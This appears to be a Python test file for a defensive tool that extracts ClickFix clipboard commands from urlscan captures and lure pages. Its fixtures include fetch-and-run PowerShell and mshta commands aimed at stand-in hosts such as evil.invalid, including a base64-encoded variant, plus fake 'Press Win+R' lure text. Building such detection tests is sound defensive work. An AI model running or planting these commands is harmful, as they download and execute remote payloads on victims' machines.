"""Layer-priority fixtures.

One test per evidence source the extractor is supposed to reach, plus the
interaction-dependent case it is supposed to give up on honestly. A local HTTP
server stands in for the lure host; urlscan tiers are driven through stubbed
ScanDetail objects and a patched response-body fetcher, so these run offline.
"""

import base64
import os
import sys
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer
from unittest import mock

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

import extractor  # noqa: E402
from config import ExtractConfig, UrlscanConfig  # noqa: E402
from extractor import (  # noqa: E402
    FAIL_INTERACTION,
    FAIL_PAGE_UNREACHABLE,
    LAYER_DOM,
    LAYER_LIVE_FINAL,
    LAYER_RESPONSE_BODY,
    LAYER_RESULT,
    LAYER_SCRIPT,
    LAYER_URLSCAN_JS,
    extract_command,
    is_plausible_command,
)
from urlscan_result import Resource, ScanDetail  # noqa: E402

PS = 'powershell -w hidden -nop -c "iex(irm http://example.invalid/a.ps1)"'
LURE_TEXT = "<h1>Verify you are human</h1><p>Press Win+R, then Ctrl+V, then Enter</p>"

ROUTES = {}


class _Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        route = ROUTES.get(self.path)
        if route is None:
            self.send_error(404)
            return
        ctype, body = route
        payload = body.encode()
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, *a):
        pass


class LayerTestCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = HTTPServer(("127.0.0.1", 0), _Handler)
        threading.Thread(target=cls.server.serve_forever, daemon=True).start()
        cls.base = f"http://127.0.0.1:{cls.server.server_port}"

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def setUp(self):
        ROUTES.clear()
        self.cfg = ExtractConfig(fetch_timeout=5)
        self.uscfg = UrlscanConfig(api_key="test-key")

    def url(self, p):
        return self.base + p

    def bodies(self, mapping):
        """Patch urlscan captured-response retrieval with a hash -> body map."""
        def fake(body_hash, cfg):
            if body_hash in mapping:
                return mapping[body_hash], None
            return None, "resource_fetch_failure:body_not_retained"

        return mock.patch.object(extractor, "fetch_response_body", side_effect=fake)


class TestFixture1_RenderedDomOnly(LayerTestCase):
    """Command exists ONLY in the rendered DOM -- the live page is dead."""

    def test_recovered_from_dom(self):
        scan = ScanDetail(
            uuid="u-dom",
            task_url=self.url("/dead"),
            final_url=self.url("/dead"),
            dom=f'{LURE_TEXT}<script>navigator.clipboard.writeText("{PS}");</script>',
        )
        r = extract_command(self.url("/dead"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.layer, LAYER_DOM)
        self.assertEqual(r.urlscan_uuid, "u-dom")

    def test_dom_wins_over_live_page(self):
        # Live page serves a decoy; the DOM holds the real payload.
        ROUTES["/live"] = ("text/html", "<textarea>notepad.exe</textarea>")
        scan = ScanDetail(
            uuid="u2",
            task_url=self.url("/live"),
            final_url=self.url("/live"),
            dom=f'<script>navigator.clipboard.writeText("{PS}");</script>',
        )
        r = extract_command(self.url("/live"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.layer, LAYER_DOM)


class TestFixture2_XhrFetchResponse(LayerTestCase):
    """Command delivered by an XHR/fetch response captured by urlscan."""

    def test_recovered_from_xhr_body(self):
        api_body = '{"cmd": "%s"}' % PS.replace('"', '\\"')
        scan = ScanDetail(
            uuid="u-xhr",
            task_url=self.url("/p"),
            final_url=self.url("/p"),
            dom="<html>nothing useful</html>",
            resources=[
                Resource(
                    url=self.url("/api/getcmd"),
                    mime="application/json",
                    rtype="xhr",
                    body_hash="hash-xhr",
                    priority=15,
                )
            ],
        )
        ROUTES["/p"] = ("text/html", "<html>nothing useful</html>")
        with self.bodies({"hash-xhr": f'<textarea>{PS}</textarea>{api_body}'}):
            r = extract_command(self.url("/p"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.layer, LAYER_RESPONSE_BODY)
        self.assertEqual(r.source_resource_url, self.url("/api/getcmd"))

    def test_useless_resources_are_never_fetched(self):
        scan = ScanDetail(
            uuid="u-img",
            task_url=self.url("/p2"),
            final_url=self.url("/p2"),
            dom="<html>x</html>",
            resources=[
                Resource(url=self.url("/logo.png"), mime="image/png", rtype="image",
                         body_hash="hash-img", priority=0),
            ],
        )
        ROUTES["/p2"] = ("text/html", "<html>x</html>")
        fetched = []

        def fake(body_hash, cfg):
            fetched.append(body_hash)
            return None, "resource_fetch_failure:body_not_retained"

        with mock.patch.object(extractor, "fetch_response_body", side_effect=fake):
            extract_command(self.url("/p2"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertEqual(fetched, [], "zero-priority resources must not be downloaded")


class TestFixture3_ExternalJsFile(LayerTestCase):
    """Command lives in an external JS file urlscan recorded."""

    def test_recovered_from_urlscan_linked_js(self):
        ROUTES["/page"] = ("text/html", "<html>nothing inline</html>")
        ROUTES["/verify.js"] = ("application/javascript",
                                f'navigator.clipboard.writeText("{PS}");')
        scan = ScanDetail(
            uuid="u-js",
            task_url=self.url("/page"),
            final_url=self.url("/page"),
            dom="<html>nothing inline</html>",
            script_urls=[self.url("/verify.js")],
        )
        r = extract_command(self.url("/page"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.layer, LAYER_URLSCAN_JS)
        self.assertEqual(r.source_resource_url, self.url("/verify.js"))

    def test_recovered_from_live_linked_js_without_urlscan(self):
        ROUTES["/page2"] = ("text/html", '<html><script src="/app.js"></script></html>')
        ROUTES["/app.js"] = ("application/javascript", f'navigator.clipboard.writeText("{PS}");')
        r = extract_command(self.url("/page2"), self.cfg)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.layer, LAYER_SCRIPT)


class TestFixture4_Iframe(LayerTestCase):
    """Command inside an iframe document."""

    def test_recovered_from_urlscan_frame_body(self):
        ROUTES["/outer"] = ("text/html", "<html>outer only</html>")
        scan = ScanDetail(
            uuid="u-frame",
            task_url=self.url("/outer"),
            final_url=self.url("/outer"),
            dom="<html>outer only</html>",
            frames=[self.url("/inner")],
            resources=[
                Resource(url=self.url("/inner"), mime="text/html", rtype="subdocument",
                         body_hash="hash-frame", priority=6)
            ],
        )
        with self.bodies({"hash-frame": f'<script>navigator.clipboard.writeText("{PS}");</script>'}):
            r = extract_command(self.url("/outer"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.layer, LAYER_RESULT)

    def test_frame_falls_back_to_live_fetch(self):
        ROUTES["/outer2"] = ("text/html", "<html>outer</html>")
        ROUTES["/inner2"] = ("text/html", f'<script>navigator.clipboard.writeText("{PS}");</script>')
        scan = ScanDetail(
            uuid="u-frame2",
            task_url=self.url("/outer2"),
            final_url=self.url("/outer2"),
            dom="<html>outer</html>",
            frames=[self.url("/inner2")],
        )
        r = extract_command(self.url("/outer2"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertEqual(r.command_text, PS)


class TestFixture5_EncodedPowerShellInResponse(LayerTestCase):
    """Base64 -enc PowerShell returned by a captured response."""

    def test_utf16le_encoded_payload_from_response_body(self):
        inner = "powershell -w hidden -nop -c iex(irm http://evil.invalid/s.ps1)"
        blob = base64.b64encode(inner.encode("utf-16-le")).decode()
        body = f'<script>navigator.clipboard.writeText(atob("{blob}"));</script>'
        scan = ScanDetail(
            uuid="u-enc",
            task_url=self.url("/e"),
            final_url=self.url("/e"),
            dom="<html>empty</html>",
            resources=[
                Resource(url=self.url("/p.js"), mime="application/javascript",
                         rtype="script", body_hash="hash-enc", priority=9)
            ],
        )
        ROUTES["/e"] = ("text/html", "<html>empty</html>")
        with self.bodies({"hash-enc": body}):
            r = extract_command(self.url("/e"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertEqual(r.command_text, inner)
        self.assertEqual(r.layer, LAYER_RESPONSE_BODY)

    def test_encoded_command_flag_survives(self):
        cmd = "powershell -enc SQBFAFgA"
        blob = base64.b64encode(cmd.encode()).decode()
        scan = ScanDetail(
            uuid="u-enc2", task_url=self.url("/e2"), final_url=self.url("/e2"),
            dom=f'<script>navigator.clipboard.writeText(atob("{blob}"));</script>',
        )
        r = extract_command(self.url("/e2"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertEqual(r.command_text, cmd)


class TestFixture6_InteractionDependent(LayerTestCase):
    """A real lure whose command urlscan still cannot reach."""

    def test_classified_interaction_dependent_not_no_command(self):
        # Clear ClickFix lure text, but the payload only arrives from a click
        # handler calling a function we cannot evaluate.
        page = (
            f"{LURE_TEXT}"
            "<script>document.getElementById('b').onclick = function() {"
            " navigator.clipboard.writeText(buildPayload(seed)); };</script>"
        )
        ROUTES["/interactive"] = ("text/html", page)
        scan = ScanDetail(
            uuid="u-int",
            task_url=self.url("/interactive"),
            final_url=self.url("/interactive"),
            dom=page,
        )
        r = extract_command(self.url("/interactive"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertIsNone(r.command_text)
        self.assertIn(r.failure_reason, (FAIL_INTERACTION, "unsupported_obfuscation"))
        self.assertGreaterEqual(r.lure_score, 4)

    def test_never_returns_js_source_as_command(self):
        page = (
            f"{LURE_TEXT}"
            "<script>navigator.clipboard.writeText(makeCmd());"
            " var hint = 'powershell will run';</script>"
        )
        ROUTES["/js"] = ("text/html", page)
        r = extract_command(self.url("/js"), self.cfg)
        self.assertFalse(is_plausible_command(r.command_text))
        self.assertIsNone(r.command_text)

    def test_dead_page_without_urlscan_is_unreachable(self):
        r = extract_command(self.url("/nothing-here"), self.cfg)
        self.assertEqual(r.failure_reason, FAIL_PAGE_UNREACHABLE)


class TestLayerOrderingAndProvenance(LayerTestCase):
    def test_layers_tried_records_the_path(self):
        ROUTES["/prov"] = ("text/html", "<html>nothing</html>")
        scan = ScanDetail(
            uuid="u-prov", task_url="http://orig.invalid/x",
            final_url=self.url("/prov"), dom="<html>nothing</html>",
            redirect_chain=["http://orig.invalid/x", self.url("/prov")],
        )
        r = extract_command("http://orig.invalid/x", self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertEqual(r.layers_tried[0], LAYER_DOM)
        self.assertEqual(r.original_url, "http://orig.invalid/x")
        self.assertIn("/prov", r.final_url)
        self.assertIsNotNone(r.normalized_url)
        self.assertEqual(len(r.redirect_chain), 2)

    def test_stops_early_once_recovered(self):
        # DOM hit means no response bodies should be fetched at all.
        scan = ScanDetail(
            uuid="u-early", task_url=self.url("/early"), final_url=self.url("/early"),
            dom=f'<script>navigator.clipboard.writeText("{PS}");</script>',
            resources=[Resource(url=self.url("/x.js"), mime="application/javascript",
                                rtype="script", body_hash="h", priority=9)],
        )
        fetched = []

        def fake(h, cfg):
            fetched.append(h)
            return None, "x"

        with mock.patch.object(extractor, "fetch_response_body", side_effect=fake):
            r = extract_command(self.url("/early"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertEqual(r.command_text, PS)
        self.assertEqual(fetched, [])

    def test_no_api_key_skips_body_layer_gracefully(self):
        ROUTES["/nokey"] = ("text/html", f'<textarea>{PS}</textarea>')
        scan = ScanDetail(
            uuid="u-nokey", task_url=self.url("/nokey"), final_url=self.url("/nokey"),
            resources=[Resource(url=self.url("/a.js"), body_hash="h", priority=9)],
        )
        r = extract_command(self.url("/nokey"), self.cfg, scan=scan,
                            urlscan_cfg=UrlscanConfig(api_key=""))
        self.assertEqual(r.command_text, PS)
        self.assertEqual(r.layer, LAYER_LIVE_FINAL)


if __name__ == "__main__":
    unittest.main(verbosity=2)


class TestFixture7_JsonPayloadResponse(LayerTestCase):
    """Command delivered in a JSON/JSONP response field (observed in the wild:
    /first_allow returning callback({"payload": "<powershell>"}))."""

    JSONP = (
        'callback({"allow": true, "payload": "Write-Host \'CF\' -F Cyan; '
        "$w=New-Object Net.WebClient; $w.DownloadFile('http://evil.invalid/a.zip','x.zip')\"})"
    )

    def test_recovered_from_jsonp_response_body(self):
        scan = ScanDetail(
            uuid="u-json", task_url=self.url("/fa"), final_url=self.url("/fa"),
            dom="<html>nothing</html>",
            resources=[Resource(url=self.url("/first_allow"), mime="text/plain",
                                rtype="xhr", body_hash="hash-json", priority=15)],
        )
        ROUTES["/fa"] = ("text/html", "<html>nothing</html>")
        with self.bodies({"hash-json": self.JSONP}):
            r = extract_command(self.url("/fa"), self.cfg, scan=scan, urlscan_cfg=self.uscfg)
        self.assertIsNotNone(r.command_text)
        self.assertEqual(r.method, "json_field")
        self.assertIn("New-Object", r.command_text)

    def test_plain_json_object(self):
        body = '{"status":"ok","cmd":"powershell -w hidden -nop -c iex(irm http://x.invalid/a)"}'
        from extractor import extract_from_text
        r = extract_from_text(body)
        self.assertEqual(r.method, "json_field")
        self.assertIn("powershell", r.command_text)

    def test_nested_json_payload(self):
        body = '{"data":{"steps":[{"run":"mshta http://evil.invalid/a.hta"}]}}'
        from extractor import extract_from_text
        self.assertEqual(extract_from_text(body).command_text, "mshta http://evil.invalid/a.hta")

    def test_benign_json_is_not_a_command(self):
        from extractor import extract_from_text
        body = '{"status":"ok","message":"verification complete","user":"alice"}'
        self.assertIsNone(extract_from_text(body).command_text)

    def test_truncated_json_uses_regex_fallback(self):
        from extractor import extract_from_text
        body = '{"payload": "powershell -w hidden -nop -enc AAAA", "next'
        r = extract_from_text(body)
        self.assertIsNotNone(r.command_text)
        self.assertIn("powershell", r.command_text)

    def test_json_field_outranks_decoy_textarea(self):
        from extractor import extract_from_text
        body = ('<textarea>notepad.exe some very long decoy string here</textarea>'
                '<pre>{"payload":"powershell -w hidden -nop"}</pre>')
        r = extract_from_text(body)
        self.assertEqual(r.method, "json_field")
